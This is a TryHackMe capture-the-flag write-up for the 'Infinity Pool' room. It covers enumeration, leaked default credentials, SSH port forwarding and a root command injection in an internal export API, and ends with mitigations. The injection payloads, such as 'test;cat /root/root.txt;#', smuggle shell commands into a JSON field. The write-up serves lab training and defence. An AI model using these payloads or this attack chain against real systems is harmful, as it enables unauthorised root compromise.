# Infinity Pool - TryHackMe Write-up

## Room Information

| Category  | Difficulty |
| --------- | ---------- |
| Boot2Root | Medium     |

## Objective

* Obtain the user flag
* Obtain the root flag

---

# Overview

Infinity Pool is a medium-difficulty Boot2Root room that focuses on enumeration, internal service discovery, SSH access, port forwarding, API abuse, and privilege escalation through command injection.

The attack chain begins with external enumeration and progresses through several internal services before culminating in a root-level command injection vulnerability.

---

# Enumeration

The first step was to enumerate the target machine using Nmap.

```bash
nmap -sC -Pn MACHINE_IP
```

## Results

```
22/tcp open  ssh
80/tcp open  http

robots.txt
```

The scan identified two accessible services:

* SSH (22)
* HTTP (80)

Additionally, the web server exposed a `robots.txt` file containing the following entries:

```
/internal/
/status
```

Although these directories did not immediately provide access, they indicated the existence of internal functionality that would likely become useful later during the assessment.

---

# Initial Access

The room required an SSH public key to be supplied.

A new RSA key pair was generated.

```bash
ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""
```

The public key was then Base64 encoded.

```bash
base64 -w0 ctf_key.pub
```

After supplying the encoded public key through the web application, SSH access was granted.

```bash
ssh -o IdentitiesOnly=yes -i ctf_key web@MACHINE_IP
```

Once authenticated, the home directory contained the user flag.

```
user.txt
```

The first objective was completed successfully.

```
THM{REDACTED}
```

---

# Local Enumeration

With shell access obtained as the `web` user, the next step was to enumerate the system.

Current user:

```bash
id
```

```
uid=1001(web)
```

Hostname:

```bash
hostname
```

Operating system:

```bash
cat /etc/os-release
```

The target was running Ubuntu 24.04 LTS.

Checking sudo privileges showed that the current user could not execute privileged commands.

```bash
sudo -l
```

```
sudo: a password is required
```

Since sudo was unavailable, attention shifted towards discovering other privilege escalation vectors.

---

# Process Enumeration

Listing the running processes revealed several Python Gunicorn applications.

```bash
ps auxww
```

Among the running services were:

| Service    | User      | Port |
| ---------- | --------- | ---- |
| Automation | root      | 9000 |
| Edge       | web       | 80   |
| Watchtower | svc-watch | 3000 |

The Automation service immediately stood out because it was running as **root**, making it an attractive privilege escalation target.

---

# Service Enumeration

The systemd service files provided additional information regarding each application.

Automation:

```bash
cat /etc/systemd/system/cc-automation.service
```

Key observations:

* Runs as root
* Listens on localhost:9000
* Uses Gunicorn

Watchtower:

```bash
cat /etc/systemd/system/cc-watchtower.service
```

Key observations:

* Runs as svc-watch
* Listens on localhost:3000

The Automation service was of particular interest because any vulnerability within it would execute with root privileges.

---

# Enumerating Internal Services

Since both services were bound to localhost, they could still be accessed from the current shell.

## Automation Service

Querying the health endpoint:

```bash
curl -sS http://127.0.0.1:9000/health
```

returned the following API documentation.

```
GET /health
POST /jobs/export
```

The `/jobs/export` endpoint required a Bearer token, indicating that further enumeration would be necessary before interacting with it.

---

## Watchtower Service

The Watchtower application homepage was available locally.

```bash
curl -sS http://127.0.0.1:3000/
```

Reviewing the homepage revealed another API endpoint.

```
/api/config
```

Querying the endpoint:

```bash
curl -sS http://127.0.0.1:3000/api/config
```

returned configuration information including:

* Automation endpoint
* Internal telephony portal
* Telephony username
* Telephony password

The configuration also mentioned that default credentials had not yet been rotated.

Although the actual values are omitted here, these credentials provided access to another internal application.

---

# SSH Port Forwarding

The telephony portal was only accessible from localhost.

SSH local port forwarding was used to expose the service to the attacking machine.

```bash
ssh -o IdentitiesOnly=yes \
-i ctf_key \
-L 8080:127.0.0.1:8080 \
web@MACHINE_IP
```

Browsing to:

```
http://127.0.0.1:8080
```

allowed authentication using the recovered credentials.

After logging in, the portal exposed the Automation API Bearer token required to interact with the Automation service.

The token has been intentionally redacted.

---

# Interacting with the Automation API

Using the recovered Bearer token, a legitimate export request was sent.

```bash
curl -X POST \
http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer <REDACTED>" \
-H "Content-Type: application/json" \
--data-binary '{"report":"latest"}'
```

The response returned the command being executed.

```
tar czf /var/automation/exports/latest.tgz /var/automation/data
```

This immediately suggested that user input was being incorporated into a shell command.

---

# Identifying Command Injection

To verify whether the `report` parameter was vulnerable to command injection, a payload was supplied.

```json
{
  "report":"test;id;#"
}
```

The response returned:

```
uid=0(root)
gid=0(root)
```

This confirmed that arbitrary shell commands were being executed as **root**.

The vulnerability existed because user-controlled input was directly concatenated into a shell command without proper sanitisation.

---

# Enumerating the Root Directory

With confirmed root command execution, the contents of the root home directory were listed.

```json
{
  "report":"test;ls /root;#"
}
```

The response revealed:

```
root.txt
```

---

# Obtaining the Root Flag

Finally, the flag was read directly.

```json
{
  "report":"test;cat /root/root.txt;#"
}
```

The response returned:

```
THM{REDACTED}
```

This completed the room.

---

# Attack Chain

```
External Enumeration
        │
        ▼
Nmap discovers SSH and HTTP
        │
        ▼
robots.txt reveals internal paths
        │
        ▼
SSH public key accepted
        │
        ▼
SSH access as web user
        │
        ▼
Local enumeration
        │
        ▼
Discovery of root-owned Automation service
        │
        ▼
Discovery of Watchtower service
        │
        ▼
Watchtower configuration leaks internal credentials
        │
        ▼
SSH port forwarding
        │
        ▼
Access to internal telephony portal
        │
        ▼
Recovery of Automation API Bearer token
        │
        ▼
Authenticated access to Automation API
        │
        ▼
Command Injection via report parameter
        │
        ▼
Root command execution
        │
        ▼
Read /root/root.txt
```

---

# Vulnerability Summary

The privilege escalation relied on chaining together several weaknesses:

1. Internal services exposed configuration information.
2. Default credentials remained in use.
3. An authenticated user could retrieve the Automation API token.
4. The Automation API constructed shell commands directly from user input.
5. The Automation service executed as the root user.

While none of these issues alone necessarily resulted in complete compromise, chaining them together resulted in full root access to the system.

---

# Mitigations

Several defensive measures would prevent this attack chain:

* Remove default credentials before deployment.
* Never expose sensitive credentials through configuration endpoints.
* Restrict access to internal administration interfaces.
* Validate and sanitise all user input.
* Avoid invoking shell commands with unsanitised user input.
* Use parameterised subprocess calls instead of shell execution where possible.
* Apply the principle of least privilege by ensuring web services do not execute as root.
* Perform regular security reviews and penetration testing to identify chained vulnerabilities before deployment.

---

## Real-World Relevance

One of the more interesting aspects of this room is its resemblance to a real-world FreePBX vulnerability.

During enumeration, the Watchtower configuration endpoint exposed credentials for a FreePBX User Control Panel (UCP) account named `FreePBXUCPTemplateCreator`, accompanied by a note indicating that the default template credentials had not yet been rotated. These credentials provided authenticated access to the internal UCP portal, where the Automation API Bearer token could be recovered.

This closely mirrors **CVE-2026-46376**, a vulnerability affecting FreePBX UCP deployments that retain hard-coded template credentials after installation or configuration. The underlying weakness is classified as **CWE-798: Use of Hard-coded Credentials**, where default or embedded credentials remain active and can be abused if administrators fail to replace them.

Although the challenge does not explicitly state that it is implementing CVE-2026-46376, the attack path clearly reflects the same security issue:

1. Default template credentials remain active.
2. An attacker authenticates to the internal UCP portal.
3. Sensitive operational information becomes accessible.

From this point, the room extends the attack chain beyond the real-world vulnerability. Rather than ending with access to the UCP, the recovered Automation API Bearer token was used to authenticate to a root-owned internal Automation service. Further testing identified a command injection vulnerability within the `/jobs/export` endpoint, ultimately resulting in arbitrary command execution as the `root` user and complete system compromise.

This demonstrates an important lesson in penetration testing: seemingly low-severity issues—such as unchanged default credentials—can become critical when combined with additional vulnerabilities. Individually, neither the exposed configuration nor the authenticated API access would necessarily lead to full compromise. However, chaining these weaknesses together resulted in a complete Boot2Root attack path.

The room serves as an excellent example of how attackers leverage multiple weaknesses in succession, rather than relying on a single critical vulnerability. It also reinforces several defensive best practices:

* Remove or rotate all default credentials before deploying systems to production.
* Avoid exposing sensitive configuration information through internal APIs.
* Apply the principle of least privilege to services handling sensitive operations.
* Validate and sanitise all user-controlled input before invoking system commands.
* Regularly audit internal applications for chained attack paths, not just individual vulnerabilities.

---

# Conclusion

Infinity Pool demonstrates how seemingly minor weaknesses can be combined into a complete system compromise. The room highlights the importance of thorough enumeration, careful analysis of internal services, and understanding how multiple low-severity issues can be chained together into a critical privilege escalation.

From an offensive security perspective, the room reinforces several important techniques including service enumeration, SSH port forwarding, authenticated API testing, and command injection discovery. From a defensive perspective, it serves as a strong reminder that secure configuration, least privilege, and proper input validation are essential to protecting production systems.
